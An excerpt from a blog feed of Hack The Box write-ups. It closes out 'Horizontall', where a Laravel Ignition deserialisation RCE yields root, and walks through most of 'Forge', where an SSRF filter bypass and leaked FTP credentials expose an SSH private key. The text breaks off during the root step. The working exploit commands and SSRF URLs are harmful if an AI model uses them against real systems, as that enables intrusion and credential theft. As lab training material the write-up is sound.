&lt;span class="code-line"&gt;Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name&lt;/span&gt;
&lt;span class="code-line"&gt;tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN      -&lt;/span&gt;
&lt;span class="code-line"&gt;tcp        0      0 localhost:1337          0.0.0.0:*               LISTEN      1803/node /usr/bin/&lt;/span&gt;
&lt;span class="code-line"&gt;tcp        0      0 localhost:8000          0.0.0.0:*               LISTEN      -&lt;/span&gt;
&lt;span class="code-line"&gt;tcp        0      0 localhost:mysql         0.0.0.0:*               LISTEN      -&lt;/span&gt;
&lt;span class="code-line"&gt;tcp        0      0 0.0.0.0:http            0.0.0.0:*               LISTEN      -&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We use SSH to establish a tunnel between our kalibox and the services.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ssh strapi@horizontall.htb -L 8000:127.0.0.1:8000&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We can then browse to the service and see that this is a
&lt;a href="https://laravel.com/"&gt;laravel&lt;/a&gt; instance.&lt;/p&gt;
&lt;p&gt;&lt;img alt="laraval" src="/media/2022.02/horizontall_02.png"&gt;&lt;/p&gt;
&lt;p&gt;A Google search for "laravel exploit" lead us to an &lt;a href="https://www.ambionics.io/blog/laravel-debug-rce"&gt;ambionics blog post&lt;/a&gt;
about a laravel RCE.&lt;/p&gt;
&lt;p&gt;Reading the article we found a &lt;a href="https://github.com/ambionics/laravel-exploits"&gt;PoC available on github&lt;/a&gt;.
We use it directly after downloading
&lt;a href="https://github.com/ambionics/phpggc"&gt;phpggc&lt;/a&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;└─$ php -d&amp;#39;phar.readonly=0&amp;#39; ./phpggc --phar phar -f -o /tmp/exploit.phar monolog/rce1 system id&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;└─$ python3 ./laravel-ignition-rce.py http://127.0.0.1:8000/ /tmp/exploit.phar&lt;/span&gt;
&lt;span class="code-line"&gt;+ Log file: /home/developer/myproject/storage/logs/laravel.log&lt;/span&gt;
&lt;span class="code-line"&gt;+ Logs cleared&lt;/span&gt;
&lt;span class="code-line"&gt;+ Successfully converted to PHAR !&lt;/span&gt;
&lt;span class="code-line"&gt;+ Phar deserialized&lt;/span&gt;
&lt;span class="code-line"&gt;--------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;uid=0(root) gid=0(root) groups=0(root)&lt;/span&gt;
&lt;span class="code-line"&gt;--------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;+ Logs cleared&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Now that we have a &lt;code&gt;root&lt;/code&gt; RCE we can just put our SSH public key in the
&lt;code&gt;authorized_keys&lt;/code&gt; file and get a &lt;code&gt;root&lt;/code&gt; SSH shell.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;└─$ php -d&amp;#39;phar.readonly=0&amp;#39; ./phpggc/phpggc --phar phar -f -o /tmp/exploit.phar monolog/rce1 system &amp;#39;cp -r /opt/strapi/.ssh/ /root/&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;└─$ python3 ./laravel-ignition-rce.py http://127.0.0.1:8000/ /tmp/exploit.phar&lt;/span&gt;
&lt;span class="code-line"&gt;+ Log file: /home/developer/myproject/storage/logs/laravel.log&lt;/span&gt;
&lt;span class="code-line"&gt;+ Logs cleared&lt;/span&gt;
&lt;span class="code-line"&gt;+ Successfully converted to PHAR !&lt;/span&gt;
&lt;span class="code-line"&gt;+ Phar deserialized&lt;/span&gt;
&lt;span class="code-line"&gt;Exploit succeeded&lt;/span&gt;
&lt;span class="code-line"&gt;+ Logs cleared&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;└─$ ssh root@horizontall.htb&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;root@horizontall:~# id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=0(root) gid=0(root) groups=0(root)&lt;/span&gt;
&lt;span class="code-line"&gt;root@horizontall:~# cat root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;3bb962593e5445ec5114b91e70c3d012&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="strapi"></category><category term="laravel"></category></entry><entry><title>HTB: Forge</title><link href="https://maggick.fr/2022/01/htb-forge.html" rel="alternate"></link><published>2022-01-21T17:25:00+01:00</published><updated>2022-01-21T17:25:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2022-01-21:/2022/01/htb-forge.html</id><summary type="html">&lt;p&gt;&lt;img alt="Forge Card" class="align-left" src="/media/2022.01/forge_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/376"&gt;Forge&lt;/a&gt; publish on
September 11, 2021 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/393721"&gt;NoobHacker9999&lt;/a&gt;.
This box is rated as a medium machine but could be qualified as an easy medium
:). It implies a SSRF and an LFI as well as some Python and a
&lt;a href="https://docs.python.org/3/library/pdb.html"&gt;PDB&lt;/a&gt;.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2022.01/forge_card.png" alt="Forge Card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/376"&gt;Forge&lt;/a&gt; publish on
September 11, 2021 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/393721"&gt;NoobHacker9999&lt;/a&gt;.
This box is rated as a medium machine but could be qualified as an easy medium
:). It implies a SSRF and an LFI as well as some Python and a
&lt;a href="https://docs.python.org/3/library/pdb.html"&gt;PDB&lt;/a&gt;.&lt;/p&gt;


&lt;h1 id="foothold"&gt;Foothold&lt;/h1&gt;
&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
&lt;p&gt;Let us start as always by a &lt;code&gt;nmap&lt;/code&gt; scan. Only port 80 (HTTP) and 22 (SSH) are
open.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.91 scan initiated Friday Sep 17 04:59:56 2021 as: nmap -sSV -p- -oN notes.md -A 10.129.220.75&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.129.220.75&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.013s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65532 closed ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT   STATE    SERVICE VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;21/tcp filtered ftp&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp open     http    Apache httpd 2.4.41 ((Ubuntu))&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="website"&gt;Website&lt;/h2&gt;
&lt;p&gt;The website is a gallery that allow to upload an image either from the
filesystem or from an URL.&lt;/p&gt;
&lt;p&gt;We use &lt;a href="https://github.com/xmendez/wfuzz"&gt;wfuzz&lt;/a&gt; in addition to the
&lt;a href="https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS"&gt;subdomain secList&lt;/a&gt;
to discover that the domain admin.forge.htb exist.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;```&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="err"&gt;└─&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;wfuzz&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;subdomains&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;top1million&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mf"&gt;5000.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;sc&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;H&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;HOST:FUZZ.forge.htb&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;forge&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;htb&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;lib&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;python3&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;dist&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;packages&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;wfuzz&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;__init__&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;py&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;34&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;UserWarning&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;Pycurl&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;is&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;not&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;compiled&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;against&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Openssl&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Wfuzz&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;might&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;not&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;work&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;correctly&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;when&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;fuzzing&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;SSL&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;sites&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Check&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Wfuzz&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;s documentation for more information.&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;********************************************************&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Wfuzz&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;3.1&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;The&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Web&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Fuzzer&lt;/span&gt;&lt;span class="w"&gt;                         &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;********************************************************&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Target&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;forge&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;htb&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Total&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;4989&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;=====================================================================&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;ID&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;Response&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="n"&gt;Lines&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;Word&lt;/span&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="n"&gt;Chars&lt;/span&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="n"&gt;Payload&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;=====================================================================&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;000000024&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;L&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;W&lt;/span&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="mi"&gt;27&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Ch&lt;/span&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;admin - admin&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="err"&gt;```&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We cannot access the admin interface as some IP filtering is in place.
We try to includ the page by uploading it as an image using the URL but it
failes with an error message: "URL contains a blacklisted address!"&lt;/p&gt;
&lt;p&gt;We try the same inclusiion by using upper case on the "FORGE" domain and got the
page http://admin.FORGE.htb&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Admin Portal&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;head&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;body&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;link&lt;/span&gt; &lt;span class="na"&gt;rel&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;stylesheet&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;text/css&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/static/css/main.css&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;header&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;nav&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt; &lt;span class="na"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;a&lt;/span&gt; &lt;span class="na"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Portal home&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;a&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt; &lt;span class="na"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;align-right margin-right&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;a&lt;/span&gt; &lt;span class="na"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/announcements&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Announcements&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;a&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt; &lt;span class="na"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;align-right&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;a&lt;/span&gt; &lt;span class="na"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/upload&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Upload image&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;a&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;nav&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;header&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;br&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;br&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;br&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;br&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;br&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;br&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;br&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;br&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;center&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Welcome Admins!&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;center&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;body&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;html&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We look at the &lt;code&gt;announcements&lt;/code&gt; page:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;li&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;An internal ftp server has been setup with credentials as user:heightofsecurity123!&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;li&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;li&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;li&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;li&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;span class="ni"&gt;&amp;amp;lt;&lt;/span&gt;url&lt;span class="ni"&gt;&amp;amp;gt;&lt;/span&gt;.&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;li&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We try to load the FTP page using the disclosed credentials
&lt;code&gt;http://admin.FORGE.htb/upload?u=ftp://user:heightofsecurity123!@FORGE.htb/&lt;/code&gt;
We got two files &lt;code&gt;user.txt&lt;/code&gt; and &lt;code&gt;snap&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;We take a look at the &lt;code&gt;.ssh/id_rsa&lt;/code&gt; file (worst case scenario it does not
exist) using &lt;code&gt;http://admin.FORGE.htb/upload?u=ftp://user:heightofsecurity123!@FORGE.htb/.ssh/id_rsa&lt;/code&gt;
and got the RSA private key. We can now connect as &lt;code&gt;user&lt;/code&gt; using SSH and grab the
user flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;└─$ ssh user@forge.htb -i id_rsa&lt;/span&gt;
&lt;span class="code-line"&gt;Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)&lt;/span&gt;
&lt;span class="code-line"&gt;user@forge:~$ cat user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;4a8aed62cdd2fca87ce185b780ee3e89&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="root"&gt;Root&lt;/h1&gt;
&lt;p&gt;We look at our privileges (&lt;code&gt;sudo -l&lt;/code&gt;) and we see that we can run &lt;code&gt;/usr/bin/python3 /opt/remote-manage.py&lt;/code&gt;
as &lt;code&gt;root&lt;/code&gt; without password. Looking at the script it is a remote manager script
that will land us a &lt;a href="https://docs.python.org/3/library/pdb.html"&gt;PDB&lt;/a&gt; if it got
a unrecognized input. So we launch the script, connect to it using another SSH
